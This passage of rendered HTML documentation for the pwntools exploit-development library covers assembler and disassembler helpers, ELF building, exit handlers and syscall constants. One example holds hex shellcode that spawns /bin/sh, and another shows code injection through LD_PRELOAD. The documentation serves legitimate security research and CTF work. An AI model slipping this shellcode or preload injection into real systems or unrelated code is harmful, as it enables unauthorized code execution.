<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;b85d000000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
<span class="go">   0:   mov    eax,0x5d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;b85d000000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
<span class="go">mov    eax,0x5d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;b817000000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="go">   0:   b8 17 00 00 00          mov    eax,0x17</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;48c7c017000000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="go">   0:   48 c7 c0 17 00 00 00    mov    rax,0x17</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;04001fe552009000&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="go">   0:   e51f0004        ldr     r0, [pc, #-4]   ; 0x4</span>
<span class="go">   4:   00900052        addseq  r0, r0, r2, asr r0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="s1">&#39;4ff00500&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;thumb&#39;</span><span class="p">,</span> <span class="n">bits</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span>
<span class="go">   0:   f04f 0005       mov.w   r0, #5</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.asm.make_elf">
<code class="descclassname">pwnlib.asm.</code><code class="descname">make_elf</code><span class="sig-paren">(</span><em>data</em>, <em>vma=None</em>, <em>strip=True</em>, <em>extract=True</em>, <em>shared=False</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.make_elf" title="Permalink to this definition">¶</a></dt>
<dd><p>Builds an ELF file with the specified binary data as its executable code.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembled code</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Load address for the ELF file</li>
<li><strong>strip</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Strip the resulting ELF file. Only matters if <code class="docutils literal"><span class="pre">extract=False</span></code>.
(Default: <code class="docutils literal"><span class="pre">True</span></code>)</li>
<li><strong>extract</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Extract the assembly from the ELF file.
If <code class="docutils literal"><span class="pre">False</span></code>, the path of the ELF file is returned.
(Default: <code class="docutils literal"><span class="pre">True</span></code>)</li>
<li><strong>shared</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Create a Dynamic Shared Object (DSO, i.e. a <code class="docutils literal"><span class="pre">.so</span></code>)
which can be loaded via <code class="docutils literal"><span class="pre">dlopen</span></code> or <code class="docutils literal"><span class="pre">LD_PRELOAD</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<p>This example creates an i386 ELF that just does
execve(&#8216;/bin/sh&#8217;,...).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bin_sh</span> <span class="o">=</span> <span class="s1">&#39;6a68682f2f2f73682f62696e89e331c96a0b5899cd80&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="n">make_elf</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">,</span> <span class="n">extract</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello; exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.asm.make_elf_from_assembly">
<code class="descclassname">pwnlib.asm.</code><code class="descname">make_elf_from_assembly</code><span class="sig-paren">(</span><em>assembly</em>, <em>vma=None</em>, <em>extract=None</em>, <em>shared=False</em>, <em>strip=False</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.make_elf_from_assembly" title="Permalink to this definition">¶</a></dt>
<dd><p>Builds an ELF file with the specified assembly as its executable code.</p>
<p>This differs from <a class="reference internal" href="#pwnlib.asm.make_elf" title="pwnlib.asm.make_elf"><code class="xref py py-func docutils literal"><span class="pre">make_elf()</span></code></a> in that all ELF symbols are preserved,
such as labels and local variables.  Use <a class="reference internal" href="#pwnlib.asm.make_elf" title="pwnlib.asm.make_elf"><code class="xref py py-func docutils literal"><span class="pre">make_elf()</span></code></a> if size matters.
Additionally, the default value for <code class="docutils literal"><span class="pre">extract</span></code> in <a class="reference internal" href="#pwnlib.asm.make_elf" title="pwnlib.asm.make_elf"><code class="xref py py-func docutils literal"><span class="pre">make_elf()</span></code></a> is
different.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This is effectively a wrapper around <a class="reference internal" href="#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a>. with setting
<code class="docutils literal"><span class="pre">extract=False</span></code>, <code class="docutils literal"><span class="pre">vma=0x10000000</span></code>, and marking the resulting
file as executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span></code>).</p>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">ELF files created with <cite>arch=thumb</cite> will prepend an ARM stub
which switches to Thumb mode.</p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>assembly</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembly code to build into an ELF</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Load address of the binary
(Default: <code class="docutils literal"><span class="pre">0x10000000</span></code>, or <code class="docutils literal"><span class="pre">0</span></code> if <code class="docutils literal"><span class="pre">shared=True</span></code>)</li>
<li><strong>extract</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Extract the full ELF data from the file.
(Default: <code class="docutils literal"><span class="pre">False</span></code>)</li>
<li><strong>shared</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Create a shared library
(Default: <code class="docutils literal"><span class="pre">False</span></code>)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments to pass to <a class="reference internal" href="#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The path to the assembled ELF (extract=False), or the data
of the assembled ELF.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<p>This example shows how to create a shared library, and load it via
<code class="docutils literal"><span class="pre">LD_PRELOAD</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;push rbp; mov rbp, rsp;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s1">&#39;Hello</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;mov rsp, rbp; pop rbp; ret&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">solib</span> <span class="o">=</span> <span class="n">make_elf_from_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">shared</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;echo&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;LD_PRELOAD&#39;</span><span class="p">:</span> <span class="n">solib</span><span class="p">})</span>
<span class="go">&#39;Hello\nWorld\n&#39;</span>
</pre></div>
</div>
<p>The same thing can be done with <a class="reference internal" href="#pwnlib.asm.make_elf" title="pwnlib.asm.make_elf"><code class="xref py py-func docutils literal"><span class="pre">make_elf()</span></code></a>, though the sizes
are different.  They both</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">file_a</span> <span class="o">=</span> <span class="n">make_elf</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">),</span> <span class="n">extract</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file_b</span> <span class="o">=</span> <span class="n">make_elf_from_assembly</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">,</span> <span class="n">extract</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">file_a</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">file_b</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">file_a</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x200</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">file_b</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x1000</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="internal-functions">
<h4>Internal Functions<a class="headerlink" href="#internal-functions" title="Permalink to this headline">¶</a></h4>
<p>These are only included so that their tests are run.</p>
<p>You should never need these.</p>
<dl class="function">
<dt id="pwnlib.asm.dpkg_search_for_binutils">
<code class="descclassname">pwnlib.asm.</code><code class="descname">dpkg_search_for_binutils</code><span class="sig-paren">(</span><em>arch</em>, <em>util</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L71-102"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.dpkg_search_for_binutils" title="Permalink to this definition">¶</a></dt>
<dd><p>Use dpkg to search for any available assemblers which will work.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A list of candidate package names.</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">asm</span><span class="o">.</span><span class="n">dpkg_search_for_binutils</span><span class="p">(</span><span class="s1">&#39;aarch64&#39;</span><span class="p">,</span> <span class="s1">&#39;as&#39;</span><span class="p">)</span>
<span class="go">[&#39;binutils-aarch64-linux-gnu&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.asm.print_binutils_instructions">
<code class="descclassname">pwnlib.asm.</code><code class="descname">print_binutils_instructions</code><span class="sig-paren">(</span><em>util</em>, <em>context</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/asm.py#L104-138"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.asm.print_binutils_instructions" title="Permalink to this definition">¶</a></dt>
<dd><p>On failure to find a binutils utility, inform the user of a way
they can get it easily.</p>
<p>Doctest:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">asm</span><span class="o">.</span><span class="n">print_binutils_instructions</span><span class="p">(</span><span class="s1">&#39;as&#39;</span><span class="p">,</span> <span class="n">context</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Could not find &#39;as&#39; installed for ContextType(arch = &#39;amd64&#39;, bits = 64, endian = &#39;little&#39;)</span>
<span class="go">Try installing binutils for this architecture:</span>
<span class="go">$ sudo apt-get install binutils</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-atexception"></span><div class="section" id="module-pwnlib.atexception">
<span id="pwnlib-atexception-callbacks-on-unhandled-exception"></span><h3><a class="reference internal" href="#module-pwnlib.atexception" title="pwnlib.atexception"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.atexception</span></code></a> &#8212; Callbacks on unhandled exception<a class="headerlink" href="#module-pwnlib.atexception" title="Permalink to this headline">¶</a></h3>
<p>Analogous to atexit, this module allows the programmer to register functions to
be run if an unhandled exception occurs.</p>
<dl class="function">
<dt id="pwnlib.atexception.register">
<code class="descclassname">pwnlib.atexception.</code><code class="descname">register</code><span class="sig-paren">(</span><em>func</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/atexception.py#L19-55"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.atexception.register" title="Permalink to this definition">¶</a></dt>
<dd><p>Registers a function to be called when an unhandled exception occurs.  The
function will be called with positional arguments <cite>args</cite> and keyword
arguments <cite>kwargs</cite>, i.e. <code class="docutils literal"><span class="pre">func(*args,</span> <span class="pre">**kwargs)</span></code>.  The current <cite>context</cite>
is recorded and will be the one used when the handler is run.</p>
<p>E.g. to suppress logging output from an exception-handler one could write:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span><span class="p">):</span>
  <span class="n">atexception</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span>
</pre></div>
</div>
<p>An identifier is returned which can be used to unregister the
exception-handler.</p>
<p>This function can be used as a decorator:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nd">@atexception</span><span class="o">.</span><span class="n">register</span>
<span class="k">def</span> <span class="nf">handler</span><span class="p">():</span>
  <span class="o">...</span>
</pre></div>
</div>
<p>Notice however that this will bind <code class="docutils literal"><span class="pre">handler</span></code> to the identifier and not the
actual exception-handler.  The exception-handler can then be unregistered
with:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">atexception</span><span class="o">.</span><span class="n">unregister</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span>
</pre></div>
</div>
<p>This function is thread safe.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.atexception.unregister">
<code class="descclassname">pwnlib.atexception.</code><code class="descname">unregister</code><span class="sig-paren">(</span><em>func</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/atexception.py#L57-64"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.atexception.unregister" title="Permalink to this definition">¶</a></dt>
<dd><p>Remove <cite>func</cite> from the collection of registered functions.  If <cite>func</cite> isn&#8217;t
registered this is a no-op.</p>
</dd></dl>

</div>
<span id="document-atexit"></span><div class="section" id="module-pwnlib.atexit">
<span id="pwnlib-atexit-replacement-for-atexit"></span><h3><a class="reference internal" href="#module-pwnlib.atexit" title="pwnlib.atexit"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.atexit</span></code></a> &#8212; Replacement for atexit<a class="headerlink" href="#module-pwnlib.atexit" title="Permalink to this headline">¶</a></h3>
<p>Replacement for the Python standard library&#8217;s atexit.py.</p>
<p>Whereas the standard <a class="reference external" href="https://docs.python.org/2.7/library/atexit.html#module-atexit" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">atexit</span></code></a> module only defines <a class="reference external" href="https://docs.python.org/2.7/library/atexit.html#atexit.register" title="(in Python v2.7)"><code class="xref py py-func docutils literal"><span class="pre">atexit.register()</span></code></a>,
this replacement module also defines <a class="reference internal" href="#pwnlib.atexit.unregister" title="pwnlib.atexit.unregister"><code class="xref py py-func docutils literal"><span class="pre">unregister()</span></code></a>.</p>
<p>This module also fixes a the issue that exceptions raised by an exit handler is
printed twice when the standard <a class="reference external" href="https://docs.python.org/2.7/library/atexit.html#module-atexit" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">atexit</span></code></a> is used.</p>
<dl class="function">
<dt id="pwnlib.atexit.register">
<code class="descclassname">pwnlib.atexit.</code><code class="descname">register</code><span class="sig-paren">(</span><em>func</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/atexit.py#L24-58"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.atexit.register" title="Permalink to this definition">¶</a></dt>
<dd><p>Registers a function to be called on program termination.  The function will
be called with positional arguments <cite>args</cite> and keyword arguments <cite>kwargs</cite>,
i.e. <code class="docutils literal"><span class="pre">func(*args,</span> <span class="pre">**kwargs)</span></code>.  The current <cite>context</cite> is recorded and will
be the one used when the handler is run.</p>
<p>E.g. to suppress logging output from an exit-handler one could write:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span><span class="p">):</span>
  <span class="n">atexit</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span>
</pre></div>
</div>
<p>An identifier is returned which can be used to unregister the exit-handler.</p>
<p>This function can be used as a decorator:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nd">@atexit</span><span class="o">.</span><span class="n">register</span>
<span class="k">def</span> <span class="nf">handler</span><span class="p">():</span>
  <span class="o">...</span>
</pre></div>
</div>
<p>Notice however that this will bind <code class="docutils literal"><span class="pre">handler</span></code> to the identifier and not the
actual exit-handler.  The exit-handler can then be unregistered with:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">atexit</span><span class="o">.</span><span class="n">unregister</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span>
</pre></div>
</div>
<p>This function is thread safe.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.atexit.unregister">
<code class="descclassname">pwnlib.atexit.</code><code class="descname">unregister</code><span class="sig-paren">(</span><em>ident</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/atexit.py#L60-67"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.atexit.unregister" title="Permalink to this definition">¶</a></dt>
<dd><p>Remove the exit-handler identified by <cite>ident</cite> from the list of registered
handlers.  If <cite>ident</cite> isn&#8217;t registered this is a no-op.</p>
</dd></dl>

</div>
<span id="document-constants"></span><div class="section" id="module-pwnlib.constants">
<span id="pwnlib-constants-easy-access-to-header-file-constants"></span><h3><a class="reference internal" href="#module-pwnlib.constants" title="pwnlib.constants"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.constants</span></code></a> &#8212; Easy access to header file constants<a class="headerlink" href="#module-pwnlib.constants" title="Permalink to this headline">¶</a></h3>
<p>Module containing constants extracted from header files.</p>
<p>The purpose of this module is to provide quick access to constants from
different architectures and operating systems.</p>
<p>The constants are wrapped by a convenience class that allows accessing
the name of the constant, while performing all normal mathematical
operations on it.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">str</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">freebsd</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">&#39;SYS_stat&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">int</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">freebsd</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">188</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">freebsd</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">&#39;0xbc&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="mi">0</span> <span class="o">|</span> <span class="n">constants</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">SYS_stat</span>
<span class="go">106</span>
<span class="gp">&gt;&gt;&gt; </span><span class="mi">0</span> <span class="o">+</span> <span class="n">constants</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">SYS_stat</span>
<span class="go">4</span>
</pre></div>
</div>
<p>The submodule <code class="docutils literal"><span class="pre">freebsd</span></code> contains all constants for FreeBSD, while the
constants for Linux have been split up by architecture.</p>
<p>The variables of the submodules will be &#8220;lifted up&#8221; by setting the
<code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.arch</span></code> or <code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.os</span></code> in a manner similar to
what happens in <a class="reference internal" href="index.html#module-pwnlib.shellcraft" title="pwnlib.shellcraft"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft</span></code></a>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="nb">int</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">188</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="nb">int</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">106</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="nb">int</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_stat</span><span class="p">)</span>
<span class="go">4</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span> <span class="o">+</span> <span class="n">constants</span><span class="o">.</span><span class="n">PROT_WRITE</span>
<span class="go">13</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span> <span class="o">+</span> <span class="n">constants</span><span class="o">.</span><span class="n">PROT_WRITE</span>
<span class="go">61</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span> <span class="o">+</span> <span class="n">constants</span><span class="o">.</span><span class="n">PROT_WRITE</span>
<span class="go">61</span>
</pre></div>
</div>
</div>
<span id="document-config"></span><div class="section" id="module-pwnlib.config">
<span id="pwnlib-config-pwntools-configuration-file"></span><h3><a class="reference internal" href="#module-pwnlib.config" title="pwnlib.config"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.config</span></code></a> &#8212; Pwntools Configuration File<a class="headerlink" href="#module-pwnlib.config" title="Permalink to this headline">¶</a></h3>
<p>Allows per-user and per-host configuration of Pwntools settings.</p>
<p>The list of configurable options includes all of the logging symbols
and colors, as well as all of the default values on the global context
object.</p>
<p>The configuration file is read from <code class="docutils literal"><span class="pre">~/.pwn.conf</span></code> and <code class="docutils literal"><span class="pre">/etc/pwn.conf</span></code>.</p>
<p>The configuration file is only read in <code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code> mode, and not
